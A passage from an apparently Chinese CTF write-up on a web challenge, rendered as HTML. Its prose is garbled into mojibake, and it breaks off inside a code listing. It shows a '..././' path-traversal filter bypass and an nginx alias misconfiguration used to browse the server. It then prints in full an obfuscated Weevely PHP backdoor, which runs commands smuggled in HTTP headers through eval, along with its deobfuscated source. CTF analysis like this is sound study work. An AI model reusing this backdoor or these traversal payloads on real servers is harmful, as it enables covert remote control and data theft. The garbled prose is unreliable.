	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804_hu11528427845614717424.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111227804_hu4058713864964259086.png 1024w"
	loading="lazy"
	
		alt="image-20250202111227804"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="746px"
	
></p>
<p>è€Œ./æ²¡æœ‰è¢«è¿‡æ»¤</p>
<p>æ‰€ä»¥æˆ‘ä»¬ç”¨&hellip;/./åŒå†™æ›¿æ¢../ç»•è¿‡</p>
<p>å¹¶æ‹¼æ¥å‰ä¸‹çš„ç›®å½•<code>..././..././..././..././/etc/nginx/sites-enabled/site.conf&amp;ext= </code></p>
<p>å‡ºç°é…ç½®æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen</span> <span class="mi">8080</span><span class="p">;</span> <span class="c1">## listen for ipv4; this line is default and implied</span>
</span></span><span class="line"><span class="cl">    <span class="n">listen</span> <span class="p">[::]:</span><span class="mi">8080</span><span class="p">;</span> <span class="c1">## listen for ipv6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">root</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span> <span class="n">index</span><span class="o">.</span><span class="n">htm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">port_in_redirect</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">server_name</span> <span class="n">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Make site accessible from http://localhost/</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#server_name localhost;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># If block for setting the time for the logfile</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">time_iso8601</span> <span class="o">~</span> <span class="s2">&#34;^(\d{4})-(\d{2})-(\d{2})&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">year</span> <span class="o">$</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">month</span> <span class="o">$</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="n">set</span> <span class="o">$</span><span class="n">day</span> <span class="o">$</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>
</span></span><span class="line"><span class="cl">    <span class="n">sendfile</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">set</span> <span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">$</span><span class="n">http_x_forwarded_for</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">~</span> <span class="p">([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span>\<span class="o">.</span><span class="p">)[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">set</span> <span class="o">$</span><span class="n">http_x_forwarded_for_filt</span> <span class="o">$</span><span class="mi">1</span><span class="err">???</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Add stdout logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">access_log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/$</span><span class="n">hostname</span><span class="o">-</span><span class="n">access</span><span class="o">-$</span><span class="n">year</span><span class="o">-$</span><span class="n">month</span><span class="o">-$</span><span class="n">day</span><span class="o">.</span><span class="n">log</span> <span class="n">openshift_log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">error_log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span><span class="o">.</span><span class="n">log</span> <span class="n">info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># First attempt to serve request as file, then</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># as directory, then fall back to index.html</span>
</span></span><span class="line"><span class="cl">        <span class="n">try_files</span> <span class="o">$</span><span class="n">uri</span> <span class="o">$</span><span class="n">uri</span><span class="o">/</span> <span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">q</span><span class="o">=$</span><span class="n">uri</span><span class="o">&amp;$</span><span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">server_tokens</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#error_page 404 /404.html;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># redirect server error pages to the static page /50x.html</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#</span>
</span></span><span class="line"><span class="cl">    <span class="n">error_page</span> <span class="mi">500</span> <span class="mi">502</span> <span class="mi">503</span> <span class="mi">504</span> <span class="o">/</span><span class="mi">50</span><span class="n">x</span><span class="o">.</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">=</span> <span class="o">/</span><span class="mi">50</span><span class="n">x</span><span class="o">.</span><span class="n">html</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">root</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~</span> \<span class="o">.</span><span class="n">php</span><span class="o">$</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try_files</span> <span class="o">$</span><span class="n">uri</span> <span class="o">$</span><span class="n">uri</span><span class="o">/</span> <span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">q</span><span class="o">=$</span><span class="n">uri</span><span class="o">&amp;$</span><span class="n">args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_split_path_info</span> <span class="o">^</span><span class="p">(</span><span class="o">.+</span>\<span class="o">.</span><span class="n">php</span><span class="p">)(</span><span class="o">/.+</span><span class="p">)</span><span class="o">$</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_pass</span> <span class="n">unix</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">php5</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">fpm</span><span class="o">.</span><span class="n">sock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">SCRIPT_FILENAME</span> <span class="o">$</span><span class="n">document_root</span><span class="o">$</span><span class="n">fastcgi_script_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">SCRIPT_NAME</span> <span class="o">$</span><span class="n">fastcgi_script_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_index</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">include</span> <span class="n">fastcgi_params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">fastcgi_param</span> <span class="n">REMOTE_ADDR</span> <span class="o">$</span><span class="n">http_x_forwarded_for</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~</span> <span class="o">/</span>\<span class="o">.</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">log_not_found</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">deny</span> <span class="n">all</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">/</span><span class="n">web</span><span class="o">-</span><span class="n">img</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">alias</span> <span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">autoindex</span> <span class="n">on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">~*</span> \<span class="o">.</span><span class="p">(</span><span class="n">ini</span><span class="o">|</span><span class="n">docx</span><span class="o">|</span><span class="n">pcapng</span><span class="o">|</span><span class="n">doc</span><span class="p">)</span><span class="o">$</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">         <span class="n">deny</span> <span class="n">all</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">include</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">nginx</span><span class="p">[</span><span class="o">.</span><span class="p">]</span><span class="n">conf</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">location /web-img {
</span></span><span class="line"><span class="cl">        alias /images/;
</span></span><span class="line"><span class="cl">        autoindex on;
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæç¤ºç›®å½•/web-imgå¯ä»¥æ–‡ä»¶éå†ã€</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610.png"
	width="1320"
	height="807"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610_hu17330926124385727111.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111845610_hu10405021244720812069.png 1024w"
	loading="lazy"
	
		alt="image-20250202111845610"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="392px"
	
></p>
<p>æƒ³åˆ°nginxçš„æºç æ³„éœ²æ¼æ´</p>
<p>ç”¨web-img../</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013.png"
	width="1144"
	height="554"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013_hu13980549875263700958.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202111941013_hu4816632197237913222.png 1024w"
	loading="lazy"
	
		alt="image-20250202111941013"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="495px"
	
></p>
<p>æŸ¥æ‰¾æœ‰ç”¨ä¿¡æ¯</p>
<p>è¿›var/www/å‘ç°hack.phpçš„å¤‡ä»½</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$U</span><span class="o">=</span><span class="s1">&#39;_/|U&#34;,&#34;/-/|U&#34;),ar|Uray|U(&#34;/|U&#34;,&#34;+&#34;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$q</span><span class="o">=</span><span class="s1">&#39;s[|U$i]=&#34;&#34;;$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$M</span><span class="o">=</span><span class="s1">&#39;l=&#34;strtolower|U&#34;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$z</span><span class="o">=</span><span class="s1">&#39;r=@$r[|U&#34;HTTP_R|UEFERER|U&#34;];$r|U|Ua=@$r[&#34;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&#34;];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s1">&#39;?:;q=0.([\\|Ud]))?,|U?/&#34;,$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&#34;|Usubst|Ur&#34;;|U|U$s&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="s1">&#39;|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$N</span><span class="o">=</span><span class="s1">&#39;|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&#34;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$C</span><span class="o">=</span><span class="s1">&#39;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&#34;|U&lt;$k&gt;$d&lt;/$k&gt;&#34;|U);@ses|U|Usion_des|Utroy();}}}}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$j</span><span class="o">=</span><span class="s1">&#39;$k|Uh=&#34;|U|U42f7&#34;;$kf=&#34;e9ac&#34;;fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&#34;&#34;;fo|Ur($i=0;$i&lt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$R</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;rO&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;rOcreatrOe_rOrOfurOncrOtion&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$J</span><span class="o">=</span><span class="s1">&#39;kf|U),|U0,3));$p=&#34;|U&#34;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="s1">&#39;r)|U;pa|Urse|U_str($u[&#34;qu|U|Uery&#34;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&#34;/([\\|U|Uw])[|U\\w-]+|U(&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;|U&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$j</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nv">$z</span><span class="o">.</span><span class="nv">$x</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="nv">$M</span><span class="o">.</span><span class="nv">$J</span><span class="o">.</span><span class="nv">$q</span><span class="o">.</span><span class="nv">$N</span><span class="o">.</span><span class="nv">$U</span><span class="o">.</span><span class="nv">$C</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$g</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$g</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹èµ·æ¥æ˜¯è¿›è¡Œäº†æ··æ·†</p>
<p>æˆ‘ä»¬å…ˆè¿è¡Œçœ‹çœ‹echo$fçœ‹çœ‹åŸæ¥çš„ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$kh=&#34;42f7&#34;;$kf=&#34;e9ac&#34;;function x($t,$k){$c=strlen($k);$l=strlen($t);$o=&#34;&#34;;for($i=0;$i&lt;$l;){for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r[&#34;HTTP_REFERER&#34;];$ra=@$r[&#34;HTTP_ACCEPT_LANGUAGE&#34;];if($rr&amp;&amp;$ra){$u=parse_url($rr);parse_str($u[&#34;query&#34;],$q);$q=array_values($q);preg_match_all(&#34;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&#34;,$ra,$m);if($q&amp;&amp;$m){@session_start();$s=&amp;$_SESSION;$ss=&#34;substr&#34;;$sl=&#34;strtolower&#34;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=&#34;&#34;;for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0){$s[$i]=&#34;&#34;;$p=$ss($p,3);}if(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);if($e){$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&#34;/_/&#34;,&#34;/-/&#34;),array(&#34;/&#34;,&#34;+&#34;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(&#34;&lt;$k&gt;$d&lt;/$k&gt;&#34;);@session_destroy();}}}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$kh=&#34;42f7&#34;;
</span></span><span class="line"><span class="cl">$kf=&#34;e9ac&#34;;
</span></span><span class="line"><span class="cl">function x($t,$k) {
</span></span><span class="line"><span class="cl">	$c=strlen($k);
</span></span><span class="line"><span class="cl">	$l=strlen($t);
</span></span><span class="line"><span class="cl">	$o=&#34;&#34;;
</span></span><span class="line"><span class="cl">	for ($i=0;$i&lt;$l;) {
</span></span><span class="line"><span class="cl">		for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) {
</span></span><span class="line"><span class="cl">			$o.=$t{$i}^$k{$j};
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	}
</span></span><span class="line"><span class="cl">	return $o;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">$r=$_SERVER;
</span></span><span class="line"><span class="cl">$rr=@$r[&#34;HTTP_REFERER&#34;];
</span></span><span class="line"><span class="cl">$ra=@$r[&#34;HTTP_ACCEPT_LANGUAGE&#34;];
</span></span><span class="line"><span class="cl">if($rr&amp;&amp;$ra) {
</span></span><span class="line"><span class="cl">	$u=parse_url($rr);
</span></span><span class="line"><span class="cl">	parse_str($u[&#34;query&#34;],$q);
</span></span><span class="line"><span class="cl">	$q=array_values($q);
</span></span><span class="line"><span class="cl">	preg_match_all(&#34;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&#34;,$ra,$m);
</span></span><span class="line"><span class="cl">	if($q&amp;&amp;$m) {
</span></span><span class="line"><span class="cl">		@session_start();
</span></span><span class="line"><span class="cl">		$s=&amp;$_SESSION;
</span></span><span class="line"><span class="cl">		$ss=&#34;substr&#34;;
</span></span><span class="line"><span class="cl">		$sl=&#34;strtolower&#34;;
</span></span><span class="line"><span class="cl">		$i=$m[1][0].$m[1][1];
</span></span><span class="line"><span class="cl">		$h=$sl($ss(md5($i.$kh),0,3));
</span></span><span class="line"><span class="cl">		$f=$sl($ss(md5($i.$kf),0,3));
</span></span><span class="line"><span class="cl">		$p=&#34;&#34;;
</span></span><span class="line"><span class="cl">		for ($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];
</span></span><span class="line"><span class="cl">		if(strpos($p,$h)===0) {
</span></span><span class="line"><span class="cl">			$s[$i]=&#34;&#34;;
</span></span><span class="line"><span class="cl">			$p=$ss($p,3);
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">		if(array_key_exists($i,$s)) {
</span></span><span class="line"><span class="cl">			$s[$i].=$p;
</span></span><span class="line"><span class="cl">			$e=strpos($s[$i],$f);
</span></span><span class="line"><span class="cl">			if($e) {
</span></span><span class="line"><span class="cl">				$k=$kh.$kf;
</span></span><span class="line"><span class="cl">				ob_start();
</span></span><span class="line"><span class="cl">				@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&#34;/_/&#34;,&#34;/-/&#34;),array(&#34;/&#34;,&#34;+&#34;),$ss($s[$i],0,$e))),$k)));
</span></span><span class="line"><span class="cl">				$o=ob_get_contents();
</span></span><span class="line"><span class="cl">				ob_end_clean();
</span></span><span class="line"><span class="cl">				$d=base64_encode(x(gzcompress($o),$k));
</span></span><span class="line"><span class="cl">				print(&#34;&lt;$k&gt;$d&lt;/$k&gt;&#34;);
</span></span><span class="line"><span class="cl">				@session_destroy();
</span></span><span class="line"><span class="cl">			}
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	}
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥ç”¨å¤§ä½¬<a class="link" href="https://phuker.github.io/posts/weevely-backdoor-code-analysis.html"  target="_blank" rel="noopener"
    >Weevelyï¼šä¸€ä¸ª PHP æ··æ·†åé—¨çš„ä»£ç åˆ†æ - Phuker&rsquo;s Blog</a>çš„poc,éœ€è¦ä¿®æ”¹configï¼Œç”¨python2è¿è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
